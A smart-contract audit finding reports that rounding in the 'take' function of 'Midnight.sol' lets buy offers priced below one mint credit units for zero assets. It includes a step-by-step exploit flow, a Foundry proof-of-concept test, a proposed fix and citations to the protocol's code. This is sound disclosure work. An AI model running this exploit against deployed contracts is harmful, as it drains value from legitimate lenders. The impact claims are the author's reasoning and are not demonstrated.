### Title
Buy-offer `mulDivDown` rounding allows zero-asset takes that create credit units for free - (`src/Midnight.sol`)

### Summary
In `Midnight.take`, when `offer.buy == true` and `offer.maxAssets > 0`, `buyerAssets` is computed with `mulDivDown`, which rounds to zero for small `units` values where `units * buyerPrice < WAD`. Because the consumed-cap accounting adds `buyerAssets` (zero) to `consumed[maker][group]`, the cap check passes even on a fully-consumed offer, and credit units are minted for the buyer with zero assets transferred. The protocol's own test `testBugBuyMaxAssetsBypass` and NatDoc comment at line 94 of `src/Midnight.sol` confirm this is a known, reproducible behavior.

### Finding Description

**Exact code path** — `src/Midnight.sol`, `take()`:

```
line 363: buyerAssets = offer.buy ? units.mulDivDown(buyerPrice, WAD)   // rounds DOWN → 0
                                  : units.mulDivUp(buyerPrice, WAD);

line 367-369: if (offer.maxAssets > 0) {
    newConsumed = consumed[offer.maker][offer.group] += buyerAssets;     // += 0
    require(newConsumed <= offer.maxAssets, ConsumedAssets());           // passes: 0 ≤ maxAssets
}

line 410: buyerPos.credit += UtilsLib.toUint128(buyerCreditIncrease);   // credit minted
line 414: sellerPos.debt   += UtilsLib.toUint128(sellerDebtIncrease);   // debt created

line 455-456: safeTransferFrom(..., buyerAssets - sellerAssets);        // transfers 0
              safeTransferFrom(..., sellerAssets);                       // transfers 0
```

**Preconditions**:
- `offer.buy = true` (maker is buyer/lender)
- `offer.maxAssets > 0` (assets-based cap)
- `buyerPrice < WAD` (i.e., `tick < MAX_TICK`; any sub-WAD price suffices)
- `units ∈ [1, WAD/buyerPrice − 1]` so that `units * buyerPrice / WAD = 0`

**Ratifier path**: The maker calls `SetterRatifier.setIsRootRatified` to ratify a Merkle root containing the buy offer. [1](#0-0)  This is the standard, permissionless ratification path — no privileged access required.

**Exploit flow**:
1. Attacker controls two addresses: `makerAddr` (buyer) and `takerAddr` (seller).
2. `makerAddr` creates a buy offer: `offer.buy = true`, `offer.maxAssets = N`, `tick` chosen so `buyerPrice < WAD`.
3. `makerAddr` calls `SetterRatifier.setIsRootRatified(makerAddr, root, true)`.
4. `takerAddr` calls `Midnight.take(offer, ..., units=1, takerAddr, ...)` where `1 * buyerPrice / WAD = 0`.
5. `buyerAssets = 0` → `consumed` unchanged → cap check passes → credit minted for `makerAddr`, debt created for `takerAddr`, 0 tokens transferred.
6. Step 4 is repeatable indefinitely (consumed never advances toward `maxAssets`).

**Why existing checks fail**:
- `require(newConsumed <= offer.maxAssets)` only checks the cap is not exceeded; it does not require `buyerAssets > 0`. [2](#0-1) 
- There is no `require(units == 0 || buyerAssets > 0)` guard anywhere in `take`.
- `SelfTake` prevents `maker == taker` but the attacker uses two distinct controlled addresses. [3](#0-2) 
- The protocol's own NatDoc acknowledges the gap: *"It is possible to give units to a fully consumed assets-based buy offer with price < 1."* [4](#0-3) 

### Impact Explanation

The attacker accumulates an unbounded number of credit units at zero asset cost. At maturity, those credit units are redeemable for real assets from the pool. The corresponding debt on `takerAddr` can be abandoned (bad debt), which is socialized across all legitimate lenders, diluting their redemption value. The attacker's net gain equals the assets redeemed minus zero paid, funded entirely by other lenders' capital. The existing test confirms the state change is real: `creditOf`, `debtOf`, and `totalUnits` all increase while token balances remain unchanged. [5](#0-4) 

### Likelihood Explanation

**Preconditions are trivially satisfiable**: any tick below `MAX_TICK` gives `buyerPrice < WAD`, and `units = 1` always satisfies `1 * buyerPrice / WAD = 0` for any `buyerPrice < WAD`. No oracle manipulation, no admin access, and no special market state is required. The attacker only needs to deploy two addresses and call `setIsRootRatified` + `take`. The attack is repeatable in a single transaction via multicall or a loop, making it gas-efficient at scale on low-fee chains.

### Recommendation

Add a guard in `take` that rejects non-zero unit fills that produce zero assets in the assets-cap branch:

```solidity
// In the offer.maxAssets > 0 branch, after computing buyerAssets/sellerAssets:
uint256 trackedAssets = offer.buy ? buyerAssets : sellerAssets;
require(units == 0 || trackedAssets > 0, ZeroAssetFill());
newConsumed = consumed[offer.maker][offer.group] += trackedAssets;
require(newConsumed <= offer.maxAssets, ConsumedAssets());
```

This ensures every non-trivial fill in assets-cap mode transfers at least one asset unit, restoring the invariant that credit creation requires a nonzero asset transfer. [6](#0-5) 

### Proof of Concept

```solidity
// Foundry unit test (mirrors testBugBuyMaxAssetsBypass, extended to show unbounded repetition)
function testFuzz_ZeroAssetCreditAccumulation(uint256 units) public {
    // buyerPrice at MAX_TICK - 16 is slightly below WAD
    uint256 buyerPrice = TickLib.tickToPrice(MAX_TICK - 16); // < WAD
    // units in [1, WAD/buyerPrice - 1] always yield buyerAssets = 0
    units = bound(units, 1, WAD / buyerPrice - 1);

    lenderOffer.buy = true;
    lenderOffer.maxUnits = 0;
    lenderOffer.maxAssets = 1e18;          // large cap, never consumed
    lenderOffer.tick = MAX_TICK - 16;

    collateralize(market, borrower, units * 100);
    deal(address(loanToken), lender, 0);   // lender pays nothing

    uint256 creditBefore = midnight.creditOf(id, lender);

    // Each take costs 0 assets but mints `units` credit
    for (uint i = 0; i < 10; i++) {
        (uint256 ba,) = take(units, borrower, lenderOffer);
        assertEq(ba, 0, "buyerAssets must be 0");
    }

    // Assert: credit increased by 10*units, 0 assets paid
    assertEq(midnight.creditOf(id, lender), creditBefore + units * 10);
    assertEq(loanToken.balanceOf(lender), 0);
    // consumed never advanced toward maxAssets
    assertEq(midnight.consumed(lender, lenderOffer.group), 0);
}
```

Expected assertions: all `assertEq` pass, demonstrating unbounded free credit accumulation. [7](#0-6)

### Citations

**File:** src/ratifiers/SetterRatifier.sol (L24-28)
```text
    function setIsRootRatified(address maker, bytes32 root, bool newIsRootRatified) public {
        require(maker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(maker, msg.sender), Unauthorized());
        isRootRatified[maker][root] = newIsRootRatified;
        emit SetIsRootRatified(msg.sender, maker, root, newIsRootRatified);
    }
```

**File:** src/Midnight.sol (L94-94)
```text
/// @dev It is possible to give units to a fully consumed assets-based buy offer with price < 1.
```

**File:** src/Midnight.sol (L354-354)
```text
        require(offer.maker != taker, SelfTake());
```

**File:** src/Midnight.sol (L363-369)
```text
        uint256 buyerAssets = offer.buy ? units.mulDivDown(buyerPrice, WAD) : units.mulDivUp(buyerPrice, WAD);
        uint256 sellerAssets = offer.buy ? units.mulDivDown(sellerPrice, WAD) : units.mulDivUp(sellerPrice, WAD);

        uint256 newConsumed;
        if (offer.maxAssets > 0) {
            newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
            require(newConsumed <= offer.maxAssets, ConsumedAssets());
```

**File:** test/TakeTest.sol (L857-889)
```text
    // Show that a buy offer with offerPrice < WAD can be taken with units > 0
    function testBugBuyMaxAssetsBypass() public {
        deal(address(loanToken), lender, 0); // lender pays 0
        collateralize(market, borrower, 100);

        lenderOffer.maxUnits = 0;
        lenderOffer.maxAssets = 1;
        lenderOffer.tick = MAX_TICK - 16; // offerPrice < WAD

        // Fully consume the offer before the take.
        vm.prank(lender);
        midnight.setConsumed(lenderOffer.group, lenderOffer.maxAssets, lender);

        uint256 lenderCreditBefore = midnight.creditOf(id, lender);
        uint256 borrowerDebtBefore = midnight.debtOf(id, borrower);
        uint256 totalUnitsBefore = midnight.totalUnits(id);
        uint256 lenderBalBefore = loanToken.balanceOf(lender);
        uint256 borrowerBalBefore = loanToken.balanceOf(borrower);

        (uint256 buyerAssets, uint256 sellerAssets) = take(1, borrower, lenderOffer);

        assertEq(buyerAssets, 0);
        assertEq(sellerAssets, 0);

        // Nothing observable to the cap or token balances changed:
        assertEq(midnight.consumed(lender, lenderOffer.group), lenderOffer.maxAssets);
        assertEq(loanToken.balanceOf(lender), lenderBalBefore);
        assertEq(loanToken.balanceOf(borrower), borrowerBalBefore);
        // But position state strictly changed:
        assertGt(midnight.creditOf(id, lender), lenderCreditBefore);
        assertGt(midnight.debtOf(id, borrower), borrowerDebtBefore);
        assertGt(midnight.totalUnits(id), totalUnitsBefore);
    }
```
